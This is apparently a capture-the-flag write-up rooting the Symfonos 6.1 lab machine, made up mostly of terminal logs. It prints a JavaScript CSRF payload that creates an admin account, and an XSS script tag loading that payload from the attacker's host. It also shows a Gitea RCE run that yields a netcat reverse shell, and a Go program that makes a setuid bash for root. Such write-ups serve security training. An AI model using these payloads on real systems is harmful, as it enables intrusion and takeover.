---
{"dg-publish":true,"permalink":"/machines/symfonos-6-1-writeup/","noteIcon":""}
---



# Symfonos6.1

Enumeration 


```bash

┌──(root㉿kali)-[~kali/exploitcasino]
└─# nmap -sS -sC --min-rate=5000 -Pn -n -T5 -p- 192.168.0.108
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-15 06:59 EST
Nmap scan report for 192.168.0.108
Host is up (0.00021s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   2048 0e:ad:33:fc:1a:1e:85:54:64:13:39:14:68:09:c1:70 (RSA)
|   256 54:03:9b:48:55:de:b3:2b:0a:78:90:4a:b3:1f:fa:cd (ECDSA)
|_  256 4e:0c:e6:3d:5c:08:09:f4:11:48:85:a2:e7:fb:8f:b7 (ED25519)
80/tcp   open  http
|_http-title: "Site doesn't have a title (text/html; charset=UTF-8)."
| http-methods: 
|_  Potentially risky methods: TRACE
3000/tcp open  ppp
3306/tcp open  mysql
5000/tcp open  upnp
```

Lets see port 80.


![Pasted image 20240115060131.png](/img/user/imgs/Pasted%20image%2020240115060131.png)

Nothing

```bash
┌──(root㉿kali)-[/home/kali]
└─# whatweb 192.168.0.108
http://192.168.0.108 [200 OK] Apache[2.4.6], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.6.40], IP[192.168.0.108], PHP[5.6.40]

┌──(root㉿kali)-[/home/kali]
└─# apt install seclists -y


┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.0.108 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.108
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/posts                (Status: 301) [Size: 235] [--> http://192.168.0.108/posts/]
/flyspray             (Status: 301) [Size: 238] [--> http://192.168.0.108/flyspray/]
Progress: 1273833 / 1273834 (100.00%)

```
Nothing interesting..

![Pasted image 20240115061112.png](/img/user/imgs/Pasted%20image%2020240115061112.png)

FileSpray

```bash

┌──(kali㉿kali)-[~]
└─$ searchsploit flyspray
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Flyspray 0.9 - Multiple Cross-Site Scripting Vulnerabilities                                                | php/webapps/26400.txt
FlySpray 0.9.7 - 'install-0.9.7.php' Remote Command Execution                                               | php/webapps/1494.php
Flyspray 0.9.9 - Information Disclosure/HTML Injection / Cross-Site Scripting                               | php/webapps/31326.txt
Flyspray 0.9.9 - Multiple Cross-Site Scripting Vulnerabilities                                              | php/webapps/30891.txt
Flyspray 0.9.9.6 - Cross-Site Request Forgery                                                               | php/webapps/18468.html
FlySpray 1.0-rc4 - Cross-Site Scripting / Cross-Site Request Forgery                                        | php/webapps/41918.txt
Mambo Component com_flyspray < 1.0.1 - Remote File Disclosure                                               | php/webapps/2852.txt
-------------------------------------

```
Checking at the doc on github
We can find the version by the upgrading file:
https://github.com/flyspray/flyspray/blob/master/docs/UPGRADING.txt
```

##Upgrading 0.9.9.* to 1.0* (1.0 alphas, 1.0 betas, Flyspray master branch on github.com)##

in your browser and follow the instructions.
```
hence lets try 
http://192.168.0.108/flyspray/docs


![Pasted image 20240115062047.png](/img/user/imgs/Pasted%20image%2020240115062047.png)

>##Upgrading 0.9.9.* to 1.0* (1.0 alphas, 1.0 betas, Flyspray master branch on github.com)##

 
 ## XSRF Stored FlySpray 1.0-rc4 
 
  ```
 Input passed via the 'real_name' parameter to '/index.php?do=myprofile' is not
properly sanitised before being returned to the user. This can be exploited
to execute arbitrary HTML and script code in a user's browser session in
context of an affected site.
```


Code
```js
var tok = document.getElementsByName('csrftoken')[0].value;
var txt = '<form method="POST" id="hacked_form"
action="index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hexreaper"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="hexreaper"/>'
txt += '<input type="hidden" name="email_address" value="hexreaper@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="hexreaper@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'
var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();

//This will create a new admin account, hexreaper:12345678



```
We inject the following script on the name field: 

```html
"><script SRC= http://192.168.0.112/flyspraypayload.js></script>
```


> //`"><script` 
> This part is attempting to close an HTML attribute (such as an input field or an image source) and immediately open a `<script>` tag.
> The `">` sequence is attempting to close an HTML attribute prematurely. This is often done in an attempt to break out of an attribute context and inject additional HTML or JavaScript code.


```bash

┌──(root㉿kali)-[/home/kali]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Lets add a comment

![Pasted image 20240115063924.png](/img/user/imgs/Pasted%20image%2020240115063924.png)


And wait for any GET requests...
```bash

┌──(root㉿kali)-[/home/kali]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.0.112 - - [15/Jan/2024 07:38:55] "GET /flyspraypayload.js HTTP/1.1" 200
192.168.0.108 - - [15/Jan/2024 07:39:32] "GET /flyspraypayload.js HTTP/1.1" 200


```
Got em!

![Pasted image 20240115065033.png](/img/user/imgs/Pasted%20image%2020240115065033.png)

Checking the second thread found 
http://192.168.0.108/flyspray/index.php?do=details&task_id=2
![Pasted image 20240115070836.png](/img/user/imgs/Pasted%20image%2020240115070836.png)

GiTea is running on port 3000.

```bash
──(root㉿kali)-[/home/kali]
└─# whatweb 192.168.0.108:3000
http://192.168.0.108:3000 [200 OK] Cookies[_csrf,i_like_gitea,lang], Country[RESERVED][ZZ], HTML5, HttpOnly[_csrf,i_like_gitea], IP[192.168.0.108], JQuery, Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Symfonos6], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[ie=edge]

┌──(root㉿kali)-[/home/kali]
└─# searchsploit GiTea
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
Gitea 1.12.5 - Remote Code Execution (Authenticated)                                        | multiple/webapps/49571.py
Gitea 1.16.6 - Remote Code Execution (RCE) (Metasploit)                                     | multiple/webapps/51009.rb
Gitea 1.4.0 - Remote Code Execution                                                         | multiple/webapps/44996.py
Gitea 1.7.5 - Remote Code Execution                                                         | multiple/webapps/49383.py

##Checked the version so we can use an authenticated RCE.

──(root㉿kali)-[/home/kali]
└─# curl  -s 192.168.0.108:3000 | grep  -w Version
                        Powered by Gitea Version: 1.11.4 Page: <strong>0ms</strong> Template: <strong>0ms</strong>


┌──(root㉿kali)-[/home/kali/Downloads]
└─# python3 CVE-2020-14144-GiTea-git-hooks-rce.py  -t http://192.168.0.108:3000 -u achilles -p h2sBr9gryBunKdF9 -I 192.168.0.112 -P 1234
    _____ _ _______
   / ____(_)__   __|             CVE-2020-14144
  | |  __ _   | | ___  __ _
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
  | |__| | |  | |  __/ (_| |
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5

[+] Starting exploit ...
*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"
  
----------------------------------------------------------------------------------------------------------------------------------------



┌──(root㉿kali)-[/home/kali/Downloads]
└─# git config --global user.email "you@example.com"


┌──(root㉿kali)-[/home/kali/Downloads]
└─# git config --global user.name "Your Name"

┌──(root㉿kali)-[/home/kali/Downloads]
└─# python3 CVE-2020-14144-GiTea-git-hooks-rce.py  -t http://192.168.0.108:3000 -u achilles -p h2sBr9gryBunKdF9 -I 192.168.0.112 -P 1234
    _____ _ _______
   / ____(_)__   __|             CVE-2020-14144
  | |  __ _   | | ___  __ _
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
  | |__| | |  | |  __/ (_| |
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5

[+] Starting exploit ...
Writing objects: 100% (3/3), 245 bytes | 245.00 KiB/s, done.
[+] Exploit completed !
```
-------------------------------------
```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.112] from (UNKNOWN) [192.168.0.108] 32978
[git@symfonos6 vuln.git]$

```

Letrs try to log in as achilles


```bash

[git@symfonos6 vuln.git]$  su achilles
 su achilles
Password: h2sBr9gryBunKdF9
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
whoami
achilles


┌──(kali㉿kali)-[~/Downloads]
└─$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa):
Created directory '/home/kali/.ssh'.

┌──(kali㉿kali)-[~/Downloads]
└─$ cat /home/kali/.ssh/id_rsa.pub | xclip -sel clip

Modified 

[achilles@symfonos6 .ssh]$ vi authorized_keys
[achilles@symfonos6 .ssh]$ ls
authorized_keys  id_rsa  id_rsa.pub

```
Now I can ssh to the machine using user achilles

Once logged in
```bash
[achilles@symfonos6 ~]$ sudo -l

User achilles may run the following commands on symfonos6:
    (ALL) NOPASSWD: /usr/local/go/bin/go
```

Seems we use **go** to copy a new **bash** to /tmp/ and give a setuid permission.

https://www.golinuxcloud.com/golang-exec-shell-commands/

```go

package main

import (
    "fmt"
    "log"
    "os/exec"
)

func main() {
    out, err := exec.Command("/bin/bash", "-c", "cp /bin/bash /tmp/pwnshell; chmod +xs /tmp/pwnshell").Output()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Println(string(out))
}

```
```bash

[achilles@symfonos6 ~]$ sudo -u root  /usr/local/go/bin/go run exploit.go
[achilles@symfonos6 ~]$ cd /tmp/
[achilles@symfonos6 tmp]$ ./pwnshell -p
pwnshell-4.2# whoami
root
pwnshell-4.2#

```

PWNED



